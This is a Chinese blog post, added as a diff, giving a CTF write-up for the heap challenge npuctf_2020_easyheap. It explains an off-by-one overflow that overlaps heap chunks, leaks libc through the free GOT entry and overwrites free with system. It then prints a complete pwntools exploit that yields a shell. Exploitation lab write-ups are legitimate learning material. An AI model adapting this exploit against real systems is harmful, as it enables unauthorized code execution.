@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>off-by-one | 鱼非愚</title><meta name="author" content="鱼非愚"><meta name="copyright" content="鱼非愚"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="知识点通过堆块的错位来改变下个堆块的size位置，从可以改写指定的位置的函数 题目npuctf_2020_easyheap参考  64位 可以改写plt表   点开就是菜单  这个存在溢出漏洞 解法先创造两个chunk  通过改写chunk0（第一个）溢出通过溢出多一个字节（0x41）使得下面两个堆块整合到一起   接着free chunk1(第二个chunk)  再重新申请一个大小为0x38的块">
+<meta property="og:type" content="article">
+<meta property="og:title" content="off-by-one">
+<meta property="og:url" content="http://example.com/2024/08/18/off-by-one/index.html">
+<meta property="og:site_name" content="鱼非愚">
+<meta property="og:description" content="知识点通过堆块的错位来改变下个堆块的size位置，从可以改写指定的位置的函数 题目npuctf_2020_easyheap参考  64位 可以改写plt表   点开就是菜单  这个存在溢出漏洞 解法先创造两个chunk  通过改写chunk0（第一个）溢出通过溢出多一个字节（0x41）使得下面两个堆块整合到一起   接着free chunk1(第二个chunk)  再重新申请一个大小为0x38的块">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.postimg.cc/kGHRZvgj/4k.jpg">
+<meta property="article:published_time" content="2024-08-18T15:03:51.000Z">
+<meta property="article:modified_time" content="2024-08-18T16:30:12.426Z">
+<meta property="article:author" content="鱼非愚">
+<meta property="article:tag" content="问题在这">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.postimg.cc/kGHRZvgj/4k.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/08/18/off-by-one/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"IFZTL6MGHC","apiKey":"8686cdc3fd8aa064b111245d76ee04a062","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'off-by-one',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-19 00:30:12'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.postimg.cc/kGHRZvgj/4k.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/%E8%83%8C%E6%99%AF1.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="鱼非愚"><span class="site-name">鱼非愚</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">off-by-one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-18T15:03:51.000Z" title="发表于 2024-08-18 23:03:51">2024-08-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-18T16:30:12.426Z" title="更新于 2024-08-19 00:30:12">2024-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn-%E5%AD%A6%E4%B9%A0/">pwn-学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="off-by-one"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>通过堆块的错位来改变下个堆块的size位置，从可以改写指定的位置的函数</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43935969/article/details/116112531">参考</a></p>
+<p><img src="/../images/off-by-one/1.png" alt="1"></p>
+<p>64位 可以改写plt表 </p>
+<p><img src="/../images/off-by-one/2.png" alt="2"></p>
+<p>点开就是菜单</p>
+<p><img src="/../images/off-by-one/3.png" alt="3"></p>
+<p>这个存在溢出漏洞</p>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="先创造两个chunk"><a href="#先创造两个chunk" class="headerlink" title="先创造两个chunk"></a>先创造两个chunk</h3><p><img src="/../images/off-by-one/4.png" alt="4"></p>
+<p><img src="/../images/off-by-one/5.png" alt="5"></p>
+<h3 id="通过改写chunk0（第一个）溢出"><a href="#通过改写chunk0（第一个）溢出" class="headerlink" title="通过改写chunk0（第一个）溢出"></a>通过改写chunk0（第一个）溢出</h3><p>通过溢出多一个字节（0x41）使得下面两个堆块整合到一起</p>
+<p><img src="/../images/off-by-one/6.png" alt="6"></p>
+<p><img src="/../images/off-by-one/7.png" alt="7"></p>
+<h3 id="接着free-chunk1-第二个chunk"><a href="#接着free-chunk1-第二个chunk" class="headerlink" title="接着free chunk1(第二个chunk)"></a>接着free chunk1(第二个chunk)</h3><p><img src="/../images/off-by-one/8.png" alt="8"></p>
+<p><img src="/../images/off-by-one/9.png" alt="9"></p>
+<h3 id="再重新申请一个大小为0x38的块"><a href="#再重新申请一个大小为0x38的块" class="headerlink" title="再重新申请一个大小为0x38的块"></a>再重新申请一个大小为0x38的块</h3><p><img src="/../images/off-by-one/10.png" alt="10"></p>
+<p>可以看到之前的0x41申请回来了</p>
+<p>这个发的是’a‘</p>
+<h3 id="利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化"><a href="#利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化" class="headerlink" title="利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化"></a>利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化</h3><p><img src="/../images/off-by-one/11.png" alt="11"></p>
+<p>这里把那个地址改成了free函数</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>通过题目里面的show函数泄露free处的libc</p>
+<p><strong>就是这个堆块的返回地址已经变成你指定的位置了，无论是输出还是改写就容易了</strong></p>
+<p><img src="/../images/off-by-one/12.png" alt="12"></p>
+<h3 id="最后找到system-将free函数改成system"><a href="#最后找到system-将free函数改成system" class="headerlink" title="最后找到system 将free函数改成system"></a>最后找到system 将free函数改成system</h3><h3 id="加上前面写入的-bin-sh-x00"><a href="#加上前面写入的-bin-sh-x00" class="headerlink" title="加上前面写入的&#x2F;bin&#x2F;sh\x00"></a>加上前面写入的&#x2F;bin&#x2F;sh\x00</h3><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./pwn&quot;)</span><br><span class="line">#p = remote(&quot;node5.buuoj.cn&quot;,29347)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">gdb.attach(p)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">	p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">	cmd(1)</span><br><span class="line">	p.recvuntil(&quot;only) :&quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">	cmd(2)</span><br><span class="line">	p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	cmd(3)</span><br><span class="line">	p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	cmd(4)</span><br><span class="line">	p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(0x18,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">create(0x18,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">payload =b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload += p64(0) * 2</span><br><span class="line">payload += p64(0x41)</span><br><span class="line"></span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">pause()</span><br><span class="line">#create(0x38,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =b&#x27;a&#x27; * 0x20 + p64(0x38) + p64(free_got)</span><br><span class="line">create(0x38,payload)</span><br><span class="line">show(1)</span><br><span class="line">free_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+b&#x27;\x00&#x27;*2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system))</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">鱼非愚</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/18/off-by-one/">http://example.com/2024/08/18/off-by-one/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">鱼非愚</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.postimg.cc/kGHRZvgj/4k.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wx.qq.com/" target="_blank"><img class="post-qr-code-img" src="/img/%E5%BE%AE%E4%BF%A1.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E6%AF%94%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/" title="羊城杯比赛pwn复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">羊城杯比赛pwn复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/29/%E6%AD%A6%E5%8A%9F%E5%B1%B1%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/" title="武功山杯pwn复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">武功山杯pwn复现</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Valine</span><span id="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.postimg.cc/kGHRZvgj/4k.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">鱼非愚</div><div class="author-info__description">慢慢写</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://yufeiyu33.github.io/yufeiyu" target="_blank" title="网址"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yfyzyyj@outlook.com" target="_blank" title="邮件"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://yufeiyu33.github.io" target="_blank" title="博客"><i class="fas fa-solid fa-ghost"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#npuctf-2020-easyheap"><span class="toc-number">2.1.</span> <span class="toc-text">npuctf_2020_easyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">解法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%88%9B%E9%80%A0%E4%B8%A4%E4%B8%AAchunk"><span class="toc-number">2.2.1.</span> <span class="toc-text">先创造两个chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%94%B9%E5%86%99chunk0%EF%BC%88%E7%AC%AC%E4%B8%80%E4%B8%AA%EF%BC%89%E6%BA%A2%E5%87%BA"><span class="toc-number">2.2.2.</span> <span class="toc-text">通过改写chunk0（第一个）溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E7%9D%80free-chunk1-%E7%AC%AC%E4%BA%8C%E4%B8%AAchunk"><span class="toc-number">2.2.3.</span> <span class="toc-text">接着free chunk1(第二个chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E9%87%8D%E6%96%B0%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AA%E5%A4%A7%E5%B0%8F%E4%B8%BA0x38%E7%9A%84%E5%9D%97"><span class="toc-number">2.2.4.</span> <span class="toc-text">再重新申请一个大小为0x38的块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8A%E4%B8%AA%E6%94%B9%E5%86%9941%E6%BA%A2%E5%87%BA%E5%AF%BC%E8%87%B4%E4%B8%8B%E4%B8%AA%E5%A0%86%E5%9D%97%E8%AE%B0%E5%BD%95%E8%BE%93%E5%85%A5%E5%86%85%E5%AE%B9%E7%9A%84%E5%9C%B0%E5%9D%80%E5%8F%91%E7%94%9F%E5%8F%98%E5%8C%96"><span class="toc-number">2.2.5.</span> <span class="toc-text">利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.2.6.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E6%89%BE%E5%88%B0system-%E5%B0%86free%E5%87%BD%E6%95%B0%E6%94%B9%E6%88%90system"><span class="toc-number">2.2.7.</span> <span class="toc-text">最后找到system 将free函数改成system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%B8%8A%E5%89%8D%E9%9D%A2%E5%86%99%E5%85%A5%E7%9A%84-bin-sh-x00"><span class="toc-number">2.2.8.</span> <span class="toc-text">加上前面写入的&#x2F;bin&#x2F;sh\x00</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/13/UAF%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%96%B0%E6%89%8B%E5%90%91%EF%BC%89/" title="UAF漏洞（hitcontraining_uaf）">UAF漏洞（hitcontraining_uaf）</a><time datetime="2024-09-13T13:44:39.000Z" title="发表于 2024-09-13 21:44:39">2024-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/08/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移（详解）">栈迁移（详解）</a><time datetime="2024-09-08T11:27:38.000Z" title="发表于 2024-09-08 19:27:38">2024-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E6%AF%94%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/" title="羊城杯比赛pwn复现">羊城杯比赛pwn复现</a><time datetime="2024-09-05T12:12:19.000Z" title="发表于 2024-09-05 20:12:19">2024-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/18/off-by-one/" title="off-by-one">off-by-one</a><time datetime="2024-08-18T15:03:51.000Z" title="发表于 2024-08-18 23:03:51">2024-08-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/29/%E6%AD%A6%E5%8A%9F%E5%B1%B1%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/" title="武功山杯pwn复现">武功山杯pwn复现</a><time datetime="2024-07-28T16:09:59.000Z" title="发表于 2024-07-29 00:09:59">2024-07-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 鱼非愚</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><script>(() => {
+  const disqus_config = function () {
+    this.page.url = 'http://example.com/2024/08/18/off-by-one/'
+    this.page.identifier = '/2024/08/18/off-by-one/'
+    this.page.title = 'off-by-one'
+  }
+
+  const disqusReset = () => {
+    window.DISQUS && window.DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addGlobalFn('themeChange', disqusReset, 'disqus')
+
+  const loadDisqus = () =>{
+    if (window.DISQUS) disqusReset()
+    else {
+      const script = document.createElement('script')
+      script.src = 'https://.disqus.com/embed.js'
+      script.setAttribute('data-timestamp', +new Date())
+      document.head.appendChild(script)
